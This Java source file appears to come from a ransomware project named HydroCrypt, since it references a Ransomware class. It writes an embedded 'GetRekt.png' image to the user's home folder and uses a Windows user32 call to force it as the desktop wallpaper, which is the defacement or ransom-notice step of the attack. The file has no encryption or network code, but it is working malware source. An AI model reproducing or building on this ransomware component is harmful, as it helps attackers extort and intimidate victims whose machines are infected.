package net.hydrotekz.HydroCrypt;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.win32.W32APIOptions;

public class Wallpaper {   

	public static interface User32 extends Library {
		User32 INSTANCE = (User32) Native.loadLibrary("user32",User32.class,W32APIOptions.DEFAULT_OPTIONS);        
		boolean SystemParametersInfo (int one, int two, String s ,int three);         
	}

	public static void changeWallpaper() throws Exception {
		// Output file
		File pic = new File(System.getProperty("user.home") + File.separator + "GetRekt.png");

		// Prepare streams
		InputStream inputStream = null;
		OutputStream outputStream = null;
		try {
			// Create streams
			inputStream = Ransomware.class.getClass().getResourceAsStream("/GetRekt.png");
			outputStream = new FileOutputStream(pic);

			// Handle bytes
			int read = 0;
			byte[] bytes = new byte[1024];

			// Write data
			while ((read = inputStream.read(bytes)) != -1) {
				outputStream.write(bytes, 0, read);
			}

			// Change wallpaper
			User32.INSTANCE.SystemParametersInfo(0x0014, 0, pic.getPath() , 1);

		} catch (Exception e){
			// Print error
			e.printStackTrace();

		} finally {
			// Close streams
			if (inputStream != null){
				inputStream.close();
			}
			if (outputStream != null){
				outputStream.close();
			}
		}
	}
}